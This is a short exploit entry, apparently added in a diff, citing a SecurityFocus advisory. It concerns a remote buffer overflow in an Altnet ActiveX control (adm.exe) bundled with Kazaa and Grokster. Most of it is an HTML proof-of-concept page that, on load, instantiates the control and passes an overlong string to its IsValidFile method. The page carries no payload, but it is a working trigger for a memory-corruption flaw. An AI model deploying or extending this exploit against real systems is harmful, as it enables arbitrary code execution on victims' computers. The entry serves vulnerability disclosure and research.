@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/11101/info
+
+Altnet is reported prone to a remote buffer overflow vulnerability. This issue presents itself in an ActiveX control installed by the application. Reportedly, a malicious attacker can exploit this issue to execute arbitrary code.
+
+<HTML>
+<HEAD>
+This overrun occurs in \program files\Altnet\Download Manager\adm.exe
+This executable is installed along with Kazaa and Grokster.
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<SCRIPT type=text/javascript>
+
+function init()
+{
+var foo = "";
+for(var icount = 0; icount < 1; icount++)
+{
+foo = foo +
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx";
+}
+
+var ngssoftware;
+ngssoftware = new ActiveXObject("ADM.ADM.1");
+
+ngssoftware["IsValidFile"](foo);
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<BODY bgColor=#ffffff onload=init()>
+</BODY></HTML>
